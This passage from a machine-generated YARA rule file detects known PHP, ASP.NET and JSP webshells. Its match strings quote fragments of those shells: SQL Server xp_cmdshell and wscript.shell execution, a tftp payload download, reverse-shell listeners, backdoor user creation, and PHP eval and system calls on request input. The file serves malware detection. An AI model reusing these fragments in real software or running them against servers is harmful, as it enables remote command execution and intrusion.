      $s17 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
      $s18 = "if( $action == \"dumpTable\" )" fullword ascii
      $s19 = "dump();" fullword ascii
      $s20 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule icesword {
   meta:
      description = "webshell - file icesword.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x3 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x4 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x5 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x6 = "Str[11] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x7 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x8 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x9 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x10 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x11 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s12 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $s13 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $s14 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $s15 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s16 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s17 = "$oralink = OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SI" ascii
      $s18 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\boot.ini d:\\a.txt';" fullword ascii
      $s20 = "Str[10] = \"Exec master.dbo.xp_cmdshell 'net user';\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule webshell_php_silic {
   meta:
      description = "webshell - file silic.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x3 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x4 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x5 = "Str[11] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x6 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x7 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x8 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x9 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s10 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $s11 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $s12 = "$wcpth=$_POST['wcpth'] ? $_POST['wcpth']:'cmd.exe';" fullword ascii
      $s13 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $s14 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
      $s15 = "* <a href=\"http://blackbap.org\" target=\"_blank\">BlackBap.Org</a><br><br>" fullword ascii
      $s16 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s17 = "Str[10] = \"Exec master.dbo.xp_cmdshell 'net user';\";" fullword ascii
      $s18 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $s19 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
      $s20 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule ghost_source {
   meta:
      description = "webshell - file ghost_source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x3 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x4 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x5 = "Str[11] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x6 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x7 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x8 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x9 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s10 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $s11 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $s12 = "$wcpth=$_POST['wcpth'] ? $_POST['wcpth']:'cmd.exe';" fullword ascii
      $s13 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $s14 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
      $s15 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s16 = "Str[10] = \"Exec master.dbo.xp_cmdshell 'net user';\";" fullword ascii
      $s17 = "<font style=\"font-size:10pt;\">&nbsp;&nbsp;<a href=\"http://www.baidu.com\" target=\"_blank\">Gh0st1.0</a>&copy;2009-2012</font" ascii
      $s18 = "<font style=\"font-size:10pt;\">&nbsp;&nbsp;<a href=\"http://www.baidu.com\" target=\"_blank\">Gh0st1.0</a>&copy;2009-2012</font" ascii
      $s19 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $s20 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
   condition:
      uint16(0) == 0x6540 and filesize < 400KB and
      1 of ($x*) and all of them
}

rule webshell_aspx_01 {
   meta:
      description = "webshell - file 01.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac6ae000d13f06fd4a0f87af57a2dcc4559fc5d5aa4cc7a1606139ffa85cf473"
   strings:
      $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
      $x2 = "                   string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\sys" ascii
      $x3 = "te 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c\" + shellcmd.Text.Trim () + \" > 8617.tmp',0,true;BULK INSERT [" ascii
      $x4 = "               string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EX" ascii
      $x5 = "                   string jksqlstr = \"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacre" ascii
      $x6 = "            string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC " ascii
      $x7 = "ecresultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + shellcmd.Text + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + " ascii
      $x8 = "                   string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Curr" ascii
      $s9 = "               SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
      $s10 = "        SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
      $s11 = "        getocmd.ExecuteNonQuery();" fullword ascii
      $s12 = "               agentcmd.ExecuteNonQuery();" fullword ascii
      $s13 = "                   string jksqlstrdel = \"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oameth" ascii
      $s14 = "            getocmd.ExecuteNonQuery();" fullword ascii
      $s15 = "                    getocmd.ExecuteNonQuery();" fullword ascii
      $s16 = "            SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
      $s17 = "                getocmd.ExecuteNonQuery();           " fullword ascii
      $s18 = "                SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
      $s19 = "        string getjknewuser = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=68915\\r\\n-User=jk\\r\\n-Password=mhjk\\r\\n-HomeDi" ascii
      $s20 = "esultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + dbcmd.Text  + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + \" EXE" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule ASP_NET_Web_BackDoor {
   meta:
      description = "webshell - file ASP.NET Web BackDoor.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "579e0f946f0d165567b7a8e933b6000368480ce09d51042e8753e4b389318dbc"
   strings:
      $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
      $x2 = "                   string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\sys" ascii
      $x3 = "te 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c\" + shellcmd.Text.Trim () + \" > 8617.tmp',0,true;BULK INSERT [" ascii
      $x4 = "               string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EX" ascii
      $x5 = "                   string jksqlstr = \"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacre" ascii
      $x6 = "            string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC " ascii
      $x7 = "ecresultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + shellcmd.Text + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + " ascii
      $x8 = "                   string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Curr" ascii
      $s9 = "               SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
      $s10 = "        SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
      $s11 = "        getocmd.ExecuteNonQuery();" fullword ascii
      $s12 = "               agentcmd.ExecuteNonQuery();" fullword ascii
      $s13 = "                   string jksqlstrdel = \"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oameth" ascii
      $s14 = "            getocmd.ExecuteNonQuery();" fullword ascii
      $s15 = "                    getocmd.ExecuteNonQuery();" fullword ascii
      $s16 = "            SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
      $s17 = "                getocmd.ExecuteNonQuery();           " fullword ascii
      $s18 = "                SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
      $s19 = "        string getjknewuser = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=68915\\r\\n-User=jk\\r\\n-Password=mhjk\\r\\n-HomeDi" ascii
      $s20 = "esultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + dbcmd.Text  + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + \" EXE" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_4ngle {
   meta:
      description = "webshell - file 4ngle.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7f08aa57086d0f2ba2f1f7a3b1c26a729bbe17f9de3776e31a0f3ba15a3ecae4"
   strings:
      $s1 = "             //System.Data.SqlClient.SqlDataReader dr = comm.ExecuteReader();" fullword ascii
      $s2 = "     System.Data.Common.DbDataReader dr= comm.ExecuteReader();" fullword ascii
      $s3 = "             System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);" fullword ascii
      $s4 = "<html><head><meta http-equiv=content-type content=" fullword ascii
      $s5 = "http://hi.baidu.com/5427518" fullword ascii
      $s6 = "         //            System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(Request[\"sql\"], conn);" fullword ascii
      $s7 = "             System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(" fullword ascii
      $s8 = "         //            System.Data.Odbc.OdbcCommand comm = new System.Data.Odbc.OdbcCommand(Request[\"sql\"], conn);" fullword ascii
      $s9 = "     System.Data.Common.DbCommand comm = conn.CreateCommand();" fullword ascii
      $s10 = "         //            System.Data.OleDb.OleDbCommand comm = new System.Data.OleDb.OleDbCommand(Request[\"sql\"], conn);" fullword ascii
      $s11 = "    System.Data.Common.DbProviderFactory factory = System.Data.Common.DbProviderFactories.GetFactory(provoder);" fullword ascii
      $s12 = "webshell" fullword ascii
      $s13 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\database.mdb" fullword ascii
      $s14 = "     System.Data.Common.DbConnection conn=factory.CreateConnection() ;" fullword ascii
      $s15 = " <head runat=" fullword ascii
      $s16 = "             System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);" fullword ascii
      $s17 = " + tmpNum + " fullword ascii
      $s18 = "     comm.CommandText = Request[\"sql\"];" fullword ascii
      $s19 = "             System.Data.DataTable dt = conn.GetSchema(" fullword ascii
      $s20 = "        //    //System.Web.HttpContext.Current.Response.Write(DropDownList1.SelectedIndex);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 60KB and
      8 of them
}

rule webshell_php_test {
   meta:
      description = "webshell - file test.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4d5bd28f0a57d59b8b7f432b550c8372d0dd53d564b25846cd1c27f649b66695"
   strings:
      $s1 = "return @file_get_contents($key);" fullword ascii
      $s2 = "foreach (array('_COOKIE','_POST','_GET') as $_request)" fullword ascii
      $s3 = "lone(_strint($log));" fullword ascii
      $s4 = "function log1($log){" fullword ascii
      $s5 = "function lone($key){" fullword ascii
      $s6 = "function _strint($key){" fullword ascii
      $s7 = "return eval($str.$key.$str);" fullword ascii
      $s8 = "log1($id);" fullword ascii
      $s9 = "$str = \"\";" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "$id = isset($id) ? $id : 2;" fullword ascii
      $s11 = "    foreach ($$_request as $_key=>$_value)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule webshell_jsp_list1 {
   meta:
      description = "webshell - file list1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
   strings:
      $x1 = "    out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='d:\\\\cmd.exe /c dir c:'></td><td><input na" ascii
      $x2 = "    out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='d:\\\\cmd.exe /c dir c:'></td><td><input na" ascii
      $s3 = "  dbm.executeSQL(sqlCmd);" fullword ascii
      $s4 = "request.getParameter(\"juliet\").equals(password)){" fullword ascii
      $s5 = "void ConnectionDBM(JspWriter out,String driver,String url,String userName,String passWord,String sqlAction,String sqlCmd)throws " ascii
      $s6 = "void ConnectionDBM(JspWriter out,String driver,String url,String userName,String passWord,String sqlAction,String sqlCmd)throws " ascii
      $s7 = "    Process ps=rt.exec(file);" fullword ascii
      $s8 = "    out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>" ascii
      $s9 = "    out.println(\"<tr><td bgcolor=menu><a href='http://blackbap.org/' target=FileFrame>About Silic Group</a></td></tr>\");" fullword ascii
      $s10 = "    out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>" ascii
      $s11 = "        con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
      $s12 = "                out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].ge" ascii
      $s13 = "  if(request.getParameter(\"Silic\")!=null&&request.getParameter(\"juliet\")!=null&&request.getParameter(\"Silic\").equals(usern" ascii
      $s14 = "            case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"driver\")),encodeChange(request.getParameter(\"conUrl" ascii
      $s15 = "erPath=\"+web_Site+\"' target=FileFrame>\"+ico(48)+\"WEB Folder</a></td></tr>\");" fullword ascii
      $s16 = "    out.print(\"<td colspan=2>file:<input name=file type=file>upload file<input title='d:\\\\silic.txt' name=UPaddress size=35 t" ascii
      $s17 = "    out.print(\"<td colspan=2>file:<input name=file type=file>upload file<input title='d:\\\\silic.txt' name=UPaddress size=35 t" ascii
      $s18 = ",encodeChange(request.getParameter(\"user\")),encodeChange(request.getParameter(\"password\")),encodeChange(request.getParameter" ascii
      $s19 = " public RunProxyService(int port){" fullword ascii
      $s20 = "      stmt.executeUpdate(sqlCmd);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule redirect {
   meta:
      description = "webshell - file redirect.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6832aebe29516a7d0ef490ae8992866e0000ad90ab3996a70d905a5646ce4534"
   strings:
      $s1 = "http://www.bbb.com/shell.asp " fullword ascii
      $s2 = "http://www.aaa.com/p.asp?txt=1&type=1&cm=0&cf=12&url=http://www.bbb.com/shell.asp" fullword ascii
      $s3 = "         codedtext = codedtext.replace(/(<(?!script\\s|frame\\s|iframe\\s|img\\s|input\\s|embed\\s)[^>]*[\\s\"';]src\\s*=\\s*['" ascii
      $s4 = "         codedtext = codedtext.replace(/(<script\\s[^>]*src\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scst+\"&txt=1&cm=\"+Sc" ascii
      $s5 = "vascript:|http:\\/{2})/ig,\"$1\"+preurl_2+\"/\");" fullword ascii
      $s6 = "           codedtext = codedtext.replace(/(<a\\s[^>]*href\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"$1\"+pre" ascii
      $s7 = "         codedtext = codedtext.replace(/(<(?:link|script)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])\\/?(?!http:\\/{2})/ig,\"$1\"+preur" ascii
      $s8 = "             codedtext = codedtext.replace(/(<form\\s[^>]*?action\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"" ascii
      $s9 = "         codedtext = codedtext.replace(/(<(?:link|script)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])\\/?(?!http:\\/{2})/ig,\"$1\"+preur" ascii
      $s10 = "         codedtext = codedtext.replace(/(<script\\s[^>]*src\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scst+\"&txt=1&cm=\"+Sc" ascii
      $s11 = "           codedtext = codedtext.replace(/(<a\\s[^>]*href\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"$1\"+pre" ascii
      $s12 = "             codedtext = codedtext.replace(/(<form\\s[^>]*?action\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"" ascii
      $s13 = "http://www.aaa.com/p.asp " fullword ascii
      $s14 = "Server.ScriptTimeout=10;" fullword ascii
      $s15 = "  Response.Write(\"<title>Error!</title>\" + e.description);" fullword ascii
      $s16 = "         codedtext = codedtext.replace(/(<(?!script\\s|frame\\s|iframe\\s|img\\s|input\\s|embed\\s)[^>]*[\\s\"';]src\\s*=\\s*['" ascii
      $s17 = "         codedtext = codedtext.replace(/(<(?:frame|iframe)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scs" ascii
      $s18 = "         codedtext = codedtext.replace(/(<(?:frame|iframe)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scs" ascii
      $s19 = "         codedtext = codedtext.replace(/(<(?!a\\s)[^>]*[\\s\"';](?:href|src|location|url|background)\\s*=\\s*['\"@])\\/?(?!#|mai" ascii
      $s20 = "</script></head>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule phpspy_2005_full {
   meta:
      description = "webshell - file phpspy_2005_full.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
   strings:
      $s1 = "</a><?=$phpinfo?><?=$shellmode?> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"?action=sqlbak\">MySQL Backup</a> | <a href" ascii
      $s2 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s3 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s4 = "$result = exec($_POST['command']);" fullword ascii
      $s5 = " angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s6 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s7 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s8 = "$info[37] = array(\"FTP\",getfun(\"ftp_login\"));" fullword ascii
      $s9 = " max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii
      $s10 = "tp://www.4ngel.net\" target=\"_blank\" title=\"" fullword ascii
      $s11 = "\",\"<a href=\\\"http://$_SERVER[SERVER_NAME]\\\" target=\\\"_blank\\\">$_SERVER[SERVER_NAME]</a>\");" fullword ascii
      $s12 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword ascii
      $s13 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s14 = "system($_POST['command']);" fullword ascii
      $s15 = "} elseif ($execfunc==\"passthru\") {" fullword ascii
      $s16 = "passthru($_POST['command']);" fullword ascii
      $s17 = "echo \"Processed in $totaltime second(s)\";" fullword ascii
      $s18 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s19 = "$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN" ascii
      $s20 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule webshell_php_shell {
   meta:
      description = "webshell - file shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));" fullword ascii
      $s3 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $s4 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $s5 = "$result = $conn->Execute($_POST['sql_query']);" fullword ascii
      $s6 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s7 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s8 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $s9 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s10 = "if($_POST['port'] != \"\" && $_POST['ip'] != \"\" && $_POST['function'] != \"\"  && $_POST['host'] != \"\" && $_POST['user'] != " ascii
